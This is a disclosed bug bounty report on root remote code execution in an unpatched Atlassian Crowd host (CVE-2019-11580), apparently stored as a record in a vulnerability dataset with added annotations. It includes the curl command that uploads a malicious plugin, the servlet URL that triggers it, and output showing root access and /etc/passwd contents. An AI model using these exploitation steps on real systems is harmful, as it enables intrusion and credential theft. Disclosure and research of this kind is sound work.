{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "cdl ",
  "title": "Root Remote Code Execution on https://\u2588\u2588\u2588",
  "content": "\nSummary:\nAtlassian Crowd is a centralized identity management application that allows companies to \"Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location.\"\nA DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.\nDescription:\nFrom Atlassian's public advisory:\nCrowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.\nThere is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the \"pdkinstall\" plugin and I was able to successfully construct a working exploit.\nStep-by-step Reproduction Instructions\nDownload and unzip my malicious plugin: rce-plugin.zip rce-plugin.zip (F519371)\ncd into the directory\nRun the following command:\nCode 149 Bytes\n1curl -k -H \"Content-Type: multipart/content\" \\\n2  --form \"file_cdl=@rce.jar;type=application/octet-stream\" https://\u2588\u2588\u2588/crowd/admin/uploadplugin.action\nYou'll see that the malicious plugin is successfully installed:\nCode 93 Bytes\n1Installed plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar\nNow visit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command whoami which is the user root\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ncontents of /etc/passwd\nCode 1.17 KiB\n1root:x:0:0:root:/root:/bin/bash\n2bin:x:1:1:bin:/bin:/sbin/nologin\n3daemon:x:2:2:daemon:/sbin:/sbin/nologin\n4adm:x:3:4:adm:/var/adm:/sbin/nologin\n5lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n6sync:x:5:0:sync:/sbin:/bin/sync\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:6:0:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin:/sbin/shutdown\n8\u2588\u2588\u2588\u2588\u2588\u2588x:7:0:\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin:/sbin/halt\n9\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:8:12:\u2588\u2588\u2588\u2588\u2588/var/spool/\u2588\u2588\u2588\u2588/sbin/nologin\n10\u2588\u2588\u2588x:10:14:\u2588\u2588\u2588/var/spool/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n11\u2588\u2588\u2588\u2588\u2588\u2588x:11:0:\u2588\u2588\u2588\u2588\u2588\u2588/root:/sbin/nologin\n12\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:12:100:\u2588\u2588\u2588\u2588\u2588\u2588\u2588/usr/\u2588\u2588\u2588\u2588/sbin/nologin\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:13:30:\u2588\u2588\u2588\u2588\u2588/var/\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n14\u2588\u2588\u2588\u2588x:14:50:FTP User:/var/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n15\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:99:99:Nobody:/:/sbin/nologin\n16\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n17\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:38:38::/etc/\u2588\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n18\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:499:76:\"Saslauthd user\":/var/empty/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n19\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:47:47::/var/spool/mqueue:/sbin/nologin\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:51:51::/var/spool/mqueue:/sbin/nologin\n21\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n22\u2588\u2588\u2588\u2588\u2588x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n23\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:74:74:Privilege-separated SSH:/var/empty/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/sbin/nologin\n24\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:81:81:System message bus:/:/sbin/nologin\n25\u2588\u2588\u2588\u2588\u2588\u2588\u2588x:500:500:EC2 Default User:/home/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/bin/bash\nProduct, Version, and Configuration (If applicable)\nCode 444 Bytes\n1Crowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)\n2Crowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)\n3Crowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)\n4Crowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)\n5Crowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)\nSuggested Mitigation/Remediation Actions\nI recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.\nImpact\nRemote code execution on https://\u2588\u2588\u2588. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons.\nSince this is running as root, an attacker could also easily backdoor the login page and steal credentials.\nThanks,\nCorben Leo (@cdl)\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570216440,
  "report_url": "https://hackerone.com/reports/632721",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Download and unzip the malicious plugin: rce-plugin.zip"
    ],
    [
      2,
      "Run the curl command to upload the plugin to the vulnerable Crowd instance: curl -k -H \"Content-Type: multipart/content\" --form \"file_cdl=@rce.jar;type=application/octet-stream\" https://\u2588\u2588\u2588/crowd/admin/uploadplugin.action"
    ],
    [
      3,
      "Visit the malicious plugin URL to execute arbitrary commands as root: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/crowd/plugins/servlet/hackerone-cdl"
    ]
  ],
  "vuln_description": "Atlassian Crowd has a vulnerability (CVE-2019-11580) where the pdkinstall development plugin is incorrectly enabled in release builds, allowing unauthenticated or authenticated attackers to install arbitrary plugins leading to remote code execution as root.",
  "reason": "The vulnerability involves reverse-engineering the pdkinstall plugin to create a malicious plugin, which requires deep understanding of the plugin architecture and crafting a payload that can be uploaded and executed. However, once the exploit is constructed, the attack steps are straightforward.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an unauthenticated or authenticated user exploiting a development plugin (pdkinstall) to install arbitrary plugins, leading to remote code execution. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application. However, this vulnerability is not about crossing authorization boundaries within the application but rather exploiting a misconfiguration (enabled development plugin in a release build) to execute arbitrary code. The detection method does not account for such misconfigurations or plugin-related vulnerabilities.",
    "is_detectable": false
  }
}